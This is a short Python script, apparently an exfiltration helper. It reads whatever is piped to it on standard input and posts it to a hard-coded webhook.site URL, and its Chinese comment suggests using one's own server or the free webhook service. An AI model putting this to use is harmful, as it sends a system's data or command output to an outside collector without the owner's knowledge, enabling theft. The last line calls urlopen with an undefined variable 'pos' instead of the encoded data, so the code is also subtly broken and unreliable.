import sys
from urllib.request import urlopen
from urllib.parse import urlencode

#可以自己架server處裡 / 免費webhook.site來做
url = "https://webhook.site/4da29d1a-9ee4-4109-8b67-c86d05b03e36"

line = sys.stdin.read()

data = {'data' : line}

post_data = urlencode(data).encode('ascii')

r = urlopen(url, pos)
